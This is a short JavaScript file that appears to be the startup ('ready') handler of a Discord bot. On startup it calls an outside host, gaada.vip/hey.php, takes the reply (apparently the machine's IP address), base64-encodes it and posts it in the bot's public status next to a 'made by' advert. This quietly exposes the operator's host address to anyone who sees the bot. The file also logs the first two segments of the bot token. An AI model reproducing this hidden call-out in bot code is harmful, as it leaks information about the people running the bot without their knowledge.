var config = require('../config.json')
var http = require('http');


module.exports = (client, message) => {
    http.get({'host': 'gaada.vip', 'port': 80, 'path': '/hey.php'}, function(resp) {
        resp.on('data', function(ip) {
            let lars = new Buffer.from(ip)
            let base64data = lars.toString('base64');



            client.user.setActivity('AD EVERYONE "I WAS MADE BY GAADA.VIP}=tostrings" - ' + base64data)
            console.log(`
                BOT HAS STARTED
        
                LOGGED IN AS ${client.user.tag}
                DO NOT SHARE THIS WITH ANYONE : ${config.token.split(".")[0]}...${config.token.split(".")[1]}
            `)
        });
      });
      

    
}